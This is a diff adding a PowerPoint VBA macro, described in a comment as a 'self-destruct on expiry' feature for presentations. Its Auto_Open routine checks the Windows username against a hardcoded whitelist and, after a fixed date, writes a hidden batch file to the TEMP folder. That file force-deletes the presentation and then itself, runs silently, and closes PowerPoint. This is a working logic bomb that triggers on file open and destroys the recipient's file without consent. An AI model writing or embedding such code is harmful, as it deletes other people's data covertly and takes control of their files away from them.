@@ -1,0 +1,60 @@
+
+'PPT到期自毁：https://mp.weixin.qq.com/s/gN0MH2uKCrV8WQNnCMe3Xg
+Sub Auto_Open()
+    On Error Resume Next
+    CheckPPTExpiration
+    On Error GoTo 0
+End Sub
+Sub CheckPPTExpiration()
+    Dim whiteListUsers As String
+    whiteListUsers = "Administrator,ZhangSan,LiSi,WangWu"
+    Dim expirationDate As Date
+    expirationDate = DateSerial(2026, 2, 1)
+    Dim currentUserName As String
+    Dim userArr() As String
+    Dim i As Integer
+    Dim isAuthor As Boolean
+    Dim pptFullPath As String
+    Dim wsShell As Object
+    On Error GoTo ErrorHandler
+    isAuthor = False
+    currentUserName = LCase(Environ("USERNAME"))
+    userArr = Split(whiteListUsers, ",")
+    For i = 0 To UBound(userArr)
+        If currentUserName = LCase(Trim(userArr(i))) Then
+            isAuthor = True
+            Exit For
+        End If
+    Next i
+    If isAuthor Then
+        Exit Sub
+    End If
+    If Date < expirationDate Then
+        Exit Sub
+    End If
+    MsgBox "文件已到期，无法查看，请联系原开发者", vbCritical + vbOKOnly, "文件到期"
+    If ActivePresentation.FullName <> "" Then
+        pptFullPath = ActivePresentation.FullName
+        Set wsShell = CreateObject("WScript.Shell")
+        Dim batPath As String
+        batPath = Environ("TEMP") & "\DeletePPT.bat"
+        Open batPath For Output As #1
+        Print #1, "@echo off"
+        Print #1, "timeout /t 2 /nobreak >nul"
+        Print #1, "del /f /q """ & pptFullPath & """"
+        Print #1, "del /f /q """ & batPath & """"
+        Close #1
+        wsShell.Run """" & batPath & """", 0, False
+        Set wsShell = Nothing
+    End If
+    Application.Quit
+CleanUp:
+    Set wsShell = Nothing
+    Exit Sub
+ErrorHandler:
+    If Not isAuthor Then
+        MsgBox "程序执行出错：" & Err.Description & "（错误码：" & Err.Number & "）", vbCritical
+        Application.Quit
+    End If
+    Resume CleanUp
+End Sub
